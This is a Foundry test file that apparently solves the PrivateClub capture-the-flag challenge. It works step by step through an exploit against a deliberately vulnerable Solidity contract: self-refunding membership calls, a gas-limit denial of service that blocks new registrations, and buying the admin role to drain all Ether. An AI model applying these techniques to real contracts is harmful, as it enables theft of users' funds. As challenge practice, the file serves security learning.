// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";


/* Goals
1. Become a member of a private club.
2. Block future registrations.
3. Withdraw all Ether from the privateClub contract. 

Solution:
1. Use becomeMember() with array full of hacker address. Funds will be transfered back to hacker
2. Call becomeMember() multiple times to populate members array. If array is to big it will revert at some point, blocking futher execution of this function.
3. Call buyAdminRole() and adminWithdraw() to get all contract ETH
*/

contract Hack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();
        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:
        address[] memory _members = new address[](3);
        _members[0] = hacker;
        _members[1] = hacker;
        _members[2] = hacker;
        club.becomeMember{value: 3 ether}(_members);

        _members = new address[](4);
        _members[0] = hacker;
        _members[1] = hacker;
        _members[2] = hacker;
        _members[3] = hacker;
        club.becomeMember{value: 4 ether}(_members);

        _members = new address[](5);
        _members[0] = hacker;
        _members[1] = hacker;
        _members[2] = hacker;
        _members[3] = hacker;
        _members[4] = hacker;
        club.becomeMember{value: 5 ether}(_members);

        _members = new address[](6);
        _members[0] = hacker;
        _members[1] = hacker;
        _members[2] = hacker;
        _members[3] = hacker;
        _members[4] = hacker;
        _members[5] = hacker;
        club.becomeMember{value: 6 ether}(_members);

        _members = new address[](7);
        _members[0] = hacker;
        _members[1] = hacker;
        _members[2] = hacker;
        _members[3] = hacker;
        _members[4] = hacker;
        _members[5] = hacker;
        _members[6] = hacker;
        club.becomeMember{value: 7 ether}(_members);

        vm.stopPrank();
        // check - hacker is member
        assertTrue(club.members(hacker));


        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();


        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:
        club.buyAdminRole{value: 10 ether}(hacker);
        club.adminWithdraw(hacker, address(club).balance);

        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}